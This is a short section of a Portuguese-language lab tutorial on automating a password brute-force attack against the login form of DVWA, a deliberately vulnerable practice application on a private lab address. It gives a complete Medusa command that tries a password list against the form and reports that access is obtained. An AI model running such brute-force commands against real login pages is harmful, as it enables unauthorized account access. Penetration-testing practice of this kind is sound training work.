# 4. Automação de Ataques em Formulário Web (DVWA)

## 4.1 Acessando o DVWA
Abra no navegador:
`http://192.168.56.5/dvwa`

## 4.2 Ajuste do nível de segurança
Menu → Security → Set to **Low**

## 4.3 Formato da requisição
Comando com Medusa:
`medusa -h 192.168.56.5 -u admin -P passwords.txt -M web-form -m FORM:"login.php" -m FORM-DATA:"username=&password=&Login=Login" -m DENY-SIGNAL:"Login failed"`

`✔ Acesso obtido com a senha correta.`
